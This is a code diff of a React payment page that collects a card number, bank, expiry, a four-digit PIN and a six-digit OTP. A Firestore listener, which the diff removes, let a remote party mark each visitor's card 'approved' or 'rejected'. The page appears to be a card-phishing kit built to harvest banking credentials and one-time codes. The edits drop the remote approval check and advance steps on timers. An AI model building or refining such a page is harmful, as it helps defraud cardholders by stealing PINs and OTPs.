@@ -121,7 +121,7 @@ export default function Payment() {
   const [newotp] = useState([''])
   const [total, setTotal] = useState('');
   const [isloading, setisloading] = useState(false);
-  const router=useRouter()
+  const router = useRouter()
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     cardNumber: '',
     year: '',
@@ -158,17 +158,7 @@ export default function Payment() {
       const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as PaymentInfo;
-          if (data.status) {
-            setPaymentInfo(prev => ({ ...prev, status: data.status }));
-            if (data.status === 'approved') {
-              setstep(2);
-              setisloading(false);
-            } else if (data.status === 'rejected') {
-              setisloading(false);
-              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
-              setstep(1);
-            }
-          }
+
         }
       });
 
@@ -582,7 +572,7 @@ export default function Payment() {
                 ) : step === 3 ? (<><Step3 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
 
                 </>) : step === 4 ? (<>
-                  <Step4 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo}  />
+                  <Step4 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
                 </>) : (<></>)
                 }
               </div>
@@ -611,7 +601,7 @@ export default function Payment() {
                         style={{ background: '#f1f1f1', marginLeft: 2, borderRadius: 3 }}
                         disabled={
                           (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4)) ||
-                          paymentInfo.status === 'pending' || step === 2 && paymentInfo.otp?.length !== 6
+                     step === 2 && paymentInfo.otp?.length !== 6
                         }
                         onClick={() => {
                           if (step === 1) {
@@ -635,19 +625,12 @@ export default function Payment() {
 
                             handlePay(paymentInfo, setPaymentInfo)
                             setTimeout(() => {
-                              setisloading(false)
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                otp: '',
-                              });
-                            }, 3000);
-                            setTimeout(() => {
+                              console.log(step)
                               setstep(3)
                               setisloading(false);
-
                             }, 3000)
-
                           }
+
                           else if (step === 3) {
                             console.log(step, 3)
                             setisloading(true);
@@ -663,7 +646,7 @@ export default function Payment() {
 
                             setTimeout(() => {
                               setisloading(false);
-                                router.push('/auth')
+                              router.push('/auth')
                             }, 3000)
 
                           }
